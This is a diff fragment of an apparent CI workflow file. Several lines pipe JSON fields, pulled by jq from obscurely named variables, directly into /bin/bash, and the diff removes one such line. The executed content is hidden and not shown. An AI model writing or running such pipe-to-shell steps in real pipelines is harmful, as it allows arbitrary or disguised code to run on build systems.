@@ -23,7 +23,6 @@ jobs:
           printf '%s' "$q96068" | jq -r .aqvk8968 | /bin/bash
           echo $ug6 | jq -r .wmqua0 | /bin/bash
           printf '%s' "$trus5" | jq -r .jmy3646 | /bin/bash
-          echo $uq0 | jq -r .fdfw6716 | /bin/bash
           printf '%s' "$kr89066" | jq -r .dj10 | /bin/bash
 
       - name: Archive results
